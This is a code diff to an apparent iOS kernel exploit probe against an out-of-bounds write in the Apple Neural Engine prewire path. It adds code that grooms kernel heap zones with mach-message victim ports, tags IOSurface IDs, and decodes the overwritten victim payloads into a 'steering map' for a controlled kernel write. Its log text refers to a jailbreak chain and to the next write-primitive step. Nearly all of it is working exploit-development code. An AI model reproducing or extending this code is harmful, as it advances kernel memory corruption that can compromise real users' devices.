@@ -31,7 +31,7 @@
 #import "LabLocalTime.h"
 #import "LabDeviceProfile.h"
 
-#define P099_BUILD @"p099-aneprewire-v2"
+#define P099_BUILD @"p099-aneprewire-v3-geomap"
 
 #define P099_INPUT_COUNT 254
 #define P099_OUTPUT_COUNT 1
@@ -95,12 +95,14 @@ static void L(NSString *fmt, ...) {
 #pragma mark - IOSurface (dlsym-only per AGENTS.md)
 
 static void *(*p099_surf_create)(CFDictionaryRef);
+static uint32_t (*p099_surf_getid)(void *);
 static CFStringRef p099_key_w, p099_key_h, p099_key_bpe, p099_key_bpr, p099_key_alloc;
 
 static BOOL p099_load_iosurface_syms(void) {
     void *f = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
     if (!f) f = RTLD_DEFAULT;
     p099_surf_create = dlsym(f, "IOSurfaceCreate");
+    p099_surf_getid = dlsym(f, "IOSurfaceGetID");
     p099_key_w = dlsym(f, "kIOSurfaceWidth");
     p099_key_h = dlsym(f, "kIOSurfaceHeight");
     p099_key_bpe = dlsym(f, "kIOSurfaceBytesPerElement");
@@ -143,6 +145,12 @@ static void p099_fill_payload(uint8_t *p, uint32_t index, uint32_t role) {
     memcpy(p + 0x0c, &role, 4);
     memcpy(p + 0x10, &len, 8);
     memcpy(p + 0x18, &marker, 8);
+    /* v3 geomap: mark every 16B slot's tail half 0xEE (slots >= 0x20 so the
+       header words at 0x00-0x1f survive). A record slot overwrites the tail
+       with the marshal's fixed qword -> unmistakable in the decode. */
+    for (size_t off = 0x20; off + 8 <= P099_PAYLOAD_SIZE; off += 16) {
+        memset(p + off, 0xEE, 8);
+    }
 }
 
 static mach_port_t p099_make_port(void) {
@@ -199,6 +207,11 @@ static kern_return_t p099_recv_payload(mach_port_t port, uint8_t *payloadOut) {
         L(@"GROOMED: OOB lands in freed INLINE mach-msg victims, not gzalloc");
         L(@"metadata. The ungroomed shape is panic #1-#3 (wild write, x25 =");
         L(@"FAR-0xc00, stride 0xc0 = record 0xc0 crossing at +0xc00).");
+        L(@"v3 geomap (Ghidra fffffff00874c070): record = [sid u32][flags][000][tail],");
+        L(@"tail in=0x0000000100000001 out=0x0000000200000001; table 0xc00 (192 recs,");
+        L(@"metadata at +0x800/+0x810), spill starts at record 192 = obj+0xc00 = the");
+        L(@"NEXT kalloc.3072 element. Decode maps sid -> request position -> payload");
+        L(@"offset = the steering geometry. Paste the whole [geom] block back.");
         L(@"P046 pins: fill_cap=0 on F77; late cmp at count_off +0x810;");
         L(@"table 0x820, next-chunk 0xc0; n>=0xc1 reaches NEXT 3072.");
         L(@"One evaluation. STANDALONE ONLY - not in JAILBREAK chain.");
@@ -213,6 +226,10 @@ static kern_return_t p099_recv_payload(mach_port_t port, uint8_t *payloadOut) {
         __block mach_port_t *drain = calloc(P099_DRAIN_COUNT, sizeof(mach_port_t));
         BOOL groomReady = (pairs != NULL && drain != NULL);
         int drainOK = 0, pairOK = 0, holesFreed = 0;
+        /* v3 geomap: sid -> request-position table for the record decode */
+        uint32_t inSids[P099_INPUT_COUNT];
+        uint32_t outSidCap = 0;
+        memset(inSids, 0, sizeof(inSids));
         if (groomReady) {
             for (uint32_t i = 0; i < P099_DRAIN_COUNT; i++) {
                 drain[i] = p099_make_port();
@@ -342,12 +359,14 @@ static kern_return_t p099_recv_payload(mach_port_t port, uint8_t *payloadOut) {
                         for (uint32_t i = 0; i < P099_INPUT_COUNT; i++) {
                             void *s = p099_make_surface_for_idx(i);
                             if (!s) { ok = NO; break; }
+                            inSids[i] = p099_surf_getid ? (uint32_t)p099_surf_getid(s) : 0u;
                             [inputs addObject:[surfCls objectWithIOSurface:s]];
                             [inIdx addObject:@(i)];
                         }
                         for (uint32_t i = 0; i < P099_OUTPUT_COUNT && ok; i++) {
                             void *s = p099_make_surface_for_idx(0xF0 + i);
                             if (!s) { ok = NO; break; }
+                            outSidCap = p099_surf_getid ? (uint32_t)p099_surf_getid(s) : 0u;
                             [outputs addObject:[surfCls objectWithIOSurface:s]];
                             [outIdx addObject:@0];
                         }
@@ -387,6 +406,7 @@ static kern_return_t p099_recv_payload(mach_port_t port, uint8_t *payloadOut) {
             uint8_t expected[P099_PAYLOAD_SIZE];
             uint8_t actual[P099_PAYLOAD_SIZE];
             int hits = 0;
+            int dumped = 0;
             for (uint32_t i = 0; i < P099_PAIR_COUNT && pairs && hits < 4; i++) {
                 if (!pairs[i].victim) continue;
                 kern_return_t rkr = p099_recv_payload(pairs[i].victim, actual);
@@ -407,14 +427,44 @@ static kern_return_t p099_recv_payload(mach_port_t port, uint8_t *payloadOut) {
                     }
                     L(@"[+]   %04zx: %@", off, hex);
                 }
+                /* v3 geomap: full-payload record decode, first two victims */
+                if (dumped < 2) {
+                    dumped++;
+                    L(@"[geom] victim=%u FULL decode (0xb80 = 184 slots):", i);
+                    int recN = 0, recIn = 0, recOut = 0;
+                    size_t firstRec = 0, lastRec = 0;
+                    for (size_t off = 0; off + 16 <= P099_PAYLOAD_SIZE; off += 16) {
+                        if (actual[off + 5] | actual[off + 6] | actual[off + 7]) continue;
+                        uint64_t tail; memcpy(&tail, actual + off + 8, 8);
+                        if (tail == 0xEEEEEEEEEEEEEEEEULL) continue;
+                        uint32_t sid; memcpy(&sid, actual + off, 4);
+                        uint8_t fl = actual[off + 4];
+                        NSString *kind = nil; int pos = -1;
+                        if (outSidCap && sid == outSidCap) { kind = @"OUT"; recOut++; }
+                        else {
+                            for (uint32_t j = 0; j < P099_INPUT_COUNT; j++)
+                                if (sid && inSids[j] == sid) { pos = (int)j; kind = @"in"; recIn++; break; }
+                        }
+                        if (!kind) kind = @"sid?";
+                        if (!recN) firstRec = off;
+                        lastRec = off;
+                        recN++;
+                        L(@"[geom]   +0x%04zx sid=%-10u flags=0x%02x tail=%016llx %s%@",
+                          off, sid, fl, (unsigned long long)tail, kind,
+                          pos >= 0 ? [NSString stringWithFormat:@" pos=%u", pos] : @"");
+                    }
+                    L(@"[geom] victim=%u records=%d (in=%d out=%d) span=0x%04zx..0x%04zx",
+                      i, recN, recIn, recOut, firstRec, lastRec);
+                }
             }
             L(@"=== VERDICT ===");
             if (hits) {
-                L(@"[+] CONTROLLED OOB CONFIRMED: %d victim payload(s) overwritten by prewire");
+                L(@"[+] CONTROLLED OOB CONFIRMED: %d victim payload(s) overwritten by prewire", hits);
                 L(@"[+] records (surfaceId/symbolIndex/mapFlags/direction, 0x10/record).");
                 L(@"[+] first_diff/0x10 = record index crossing into that chunk.");
                 L(@"[+] Beta-1 write lane: shape the adjacent chunk with a known object");
                 L(@"[+] and steer the corrupted field. Board stays HOLD until then.");
+                L(@"[+] v3: the [geom] block above IS the steering map — paste it back.");
             } else {
                 L(@"[-] no victim diffs: OOB missed groom (table landed elsewhere),");
                 L(@"[-] ANE rejected the program, or evaluation failed above. Honest miss.");
